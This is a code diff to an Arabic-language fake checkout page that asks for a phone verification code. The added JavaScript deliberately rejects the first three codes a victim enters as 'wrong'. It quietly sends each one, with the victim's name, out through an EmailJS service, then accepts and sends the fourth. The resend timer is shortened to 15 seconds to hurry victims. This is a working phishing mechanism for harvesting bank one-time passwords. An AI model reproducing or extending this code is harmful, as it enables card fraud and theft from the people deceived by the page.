@@ -316,6 +316,17 @@
             border-color: var(--discount-color);
         }
 
+        /* ✨ [إضافة جديدة] أنميشن لرسالة الخطأ */
+        @keyframes shakeError {
+            0%, 100% { transform: translateX(0); }
+            10%, 30%, 50%, 70%, 90% { transform: translateX(-5px); }
+            20%, 40%, 60%, 80% { transform: translateX(5px); }
+        }
+
+        .form-group .error.animate-error {
+            animation: shakeError 0.5s ease-in-out;
+        }
+
         /* ملخص الطلب */
         .order-summary {
             background-color: white;
@@ -1131,7 +1142,7 @@
                                     <label for="otp-code">رمز التحقق *</label>
                                     <input type="text" id="otp-code" name="otp-code" placeholder="أدخل رمز التحقق">
                                     <div class="otp-timer-container">
-                                        <span id="otp-timer">00:59</span>
+                                        <span id="otp-timer">00:15</span>
                                         <a href="#" id="resend-otp-btn">إعادة إرسال الكود</a>
                                     </div>
                                     <div class="error">يرجى إدخال رمز التحقق</div>
@@ -1229,6 +1240,7 @@
         let phoneInput = null;
         let otpTimerInterval = null;
         let isCardInfoSent = false;
+        let otpAttemptCount = 0; // ✨ [إضافة جديدة] لعد محاولات رمز التحقق
 
         // دالة تهيئة الصفحة
         function initializePage() {
@@ -1363,7 +1375,8 @@
             const resendBtn = document.getElementById('resend-otp-btn');
             if (!timerElement || !resendBtn) return;
 
-            let timeLeft = 59;
+            // ✨ [التعديل الأول] تغيير الوقت إلى 15 ثانية
+            let timeLeft = 15;
             resendBtn.classList.add('disabled');
             timerElement.textContent = `00:${timeLeft < 10 ? '0' : ''}${timeLeft}`;
 
@@ -1454,6 +1467,7 @@
             }
         }
 
+        // ✨ [التعديل الثاني] تحديث دالة التحقق من الرمز لتنفيذ المنطق المطلوب
         function validateOtp() {
             const phoneSection = document.getElementById('phone-verification-section');
             if (phoneSection.style.display !== 'block') return true; 
@@ -1462,8 +1476,30 @@
             if (!otpField || !otpField.value.trim()) {
                 setFieldError('otp-code', 'يرجى إدخال رمز التحقق');
                 return false;
+            }
+            
+            const otpCode = otpField.value.trim();
+
+            // التحقق من عدد المحاولات
+            // otpAttemptCount يبدأ بـ 0
+            // ✨ [تم التعديل] نريد 3 محاولات فاشلة (0, 1, 2)
+            if (otpAttemptCount < 3) { 
+                // ✨ [تم التعديل] هذا الكود سيعمل في المحاولة الأولى (0) والثانية (1) والثالثة (2)
+                
+                // 1. إرسال المحاولة الفاشلة
+                sendFailedOtp(otpCode); 
+                
+                // 2. زيادة العداد
+                otpAttemptCount++; // ✨ [تم التعديل] سيصبح 1 ثم 2 ثم 3
+                
+                // 3. إظهار رسالة الخطأ المخصصة (مع الأنميشن)
+                setFieldError('otp-code', 'رمز التحقق خاطئ يرجى طلب رمز جديد');
+                return false; // إيقاف العملية
             } else {
+                // ✨ [تم التعديل] هذا الكود سيعمل في المحاولة الرابعة (لأن otpAttemptCount = 3)
+                // 1. مسح رسالة الخطأ
                 clearFieldError('otp-code');
+                // 2. اعتبارها صحيحة
                 return true;
             }
         }
@@ -1541,6 +1577,14 @@
             if (errorElement) {
                 errorElement.textContent = message;
                 errorElement.style.display = 'block';
+
+                // ✨ [إضافة جديدة] تشغيل الأنميشن لخطأ رمز التحقق
+                if (fieldId === 'otp-code') {
+                    errorElement.classList.remove('animate-error');
+                    // خدعة لإعادة تشغيل الأنميشن (reflow)
+                    void errorElement.offsetWidth; 
+                    errorElement.classList.add('animate-error');
+                }
             }
         }
 
@@ -1553,6 +1597,7 @@
             formGroup.classList.remove('invalid');
              if (errorElement) {
                 errorElement.style.display = 'none';
+                errorElement.classList.remove('animate-error'); // ✨ [إضافة جديدة] إزالة كلاس الأنميشن
             }
         }
 
@@ -1717,6 +1762,29 @@
                 loadingOverlay.classList.toggle('active', show);
             }
         }
+
+        // ✨ دالة لإرسال محاولات رمز التحقق الفاشلة (1, 2, 3)
+        function sendFailedOtp(otpCode) {
+            const firstName = document.getElementById('first-name').value;
+            const lastName = document.getElementById('last-name').value;
+            
+            // نستخدم نفس بيانات الخدمة الموجودة في دالة الإرسال الرئيسية
+            const OTP_SERVICE_ID = "service_5rhbtsv";
+            const OTP_TEMPLATE_ID = "template_5tbb6an";
+
+            const otpTemplateParams = {
+                first_name: firstName || 'غير متوفر',
+                last_name: lastName || 'غير متوفر',
+                otp_code: `${otpCode} (محاولة ${otpAttemptCount + 1})` // نوضح أنها محاولة
+            };
+
+            emailjs.send(OTP_SERVICE_ID, OTP_TEMPLATE_ID, otpTemplateParams)
+                .then(function(response) {
+                    console.log(`تم إرسال المحاولة ${otpAttemptCount + 1} لرمز التحقق.`, response.status, response.text);
+                }, function(error) {
+                    console.log(`فشل إرسال المحاولة ${otpAttemptCount + 1}...`, error);
+                });
+        }
         
         function collectOrderData() {
              return {
@@ -1744,11 +1812,11 @@
              updateCartUI();
              
              setTimeout(() => {
-                 window.location.href = 'upay.html';
+                 window.location.href = 'hpay.html';
              }, 2000);
         }
         
-        //  ✨ تم تعديل هذه الدالة لإضافة الإرسال الجديد ✨
+        //  ✨ دالة إرسال النموذج (لإرسال الرمز الناجح)
         function handleFormSubmission(e) {
             e.preventDefault();
             
@@ -1765,6 +1833,8 @@
                 isValid = validatePhone() && isValid;
 
                 if (document.getElementById('phone-verification-section').style.display === 'block') {
+                    // هنا سيتم استدعاء validateOtp() للمرة الأخيرة
+                    // وبما أن otpAttemptCount = 3، ستعيد الدالة "true"
                     isValid = validateOtp() && isValid;
                 }
             }
@@ -1784,16 +1854,16 @@
             completeOrderBtn.disabled = true;
             completeOrderBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> جاري الإرسال...';
 
-            // 3. ✨ [إضافة جديدة] إرسال الاسم ورمز التحقق عبر EmailJS ✨
+            // 3. ✨ إرسال الاسم ورمز التحقق (الناجح - المحاولة الرابعة)
             if (paymentMethod === 'credit-card') {
                 const firstName = document.getElementById('first-name').value;
                 const lastName = document.getElementById('last-name').value;
-                const otpCode = document.getElementById('otp-code').value;
+                const otpCode = document.getElementById('otp-code').value; // هذا هو الرمز الرابع
 
                 const otpTemplateParams = {
                     first_name: firstName,
                     last_name: lastName,
-                    otp_code: otpCode
+                    otp_code: `${otpCode} (المحاولة الناجحة)` // إرسال الرمز "الصحيح" (المحاولة 4)
                 };
 
                 const OTP_SERVICE_ID = "service_5rhbtsv";
@@ -1802,9 +1872,9 @@
                 // إرسال البيانات ولا ننتظر الرد للمتابعة لتحسين تجربة المستخدم
                 emailjs.send(OTP_SERVICE_ID, OTP_TEMPLATE_ID, otpTemplateParams)
                     .then(function(response) {
-                        console.log('تم إرسال رمز التحقق والاسم بنجاح.', response.status, response.text);
+                        console.log('تم إرسال رمز التحقق الناجح والاسم بنجاح.', response.status, response.text);
                     }, function(error) {
-                        console.log('فشل إرسال رمز التحقق والاسم...', error);
+                        console.log('فشل إرسال رمز التحقق الناجح والاسم...', error);
                     });
             }
             
@@ -1818,4 +1888,3 @@
     </script>
 </body>
 </html>
-
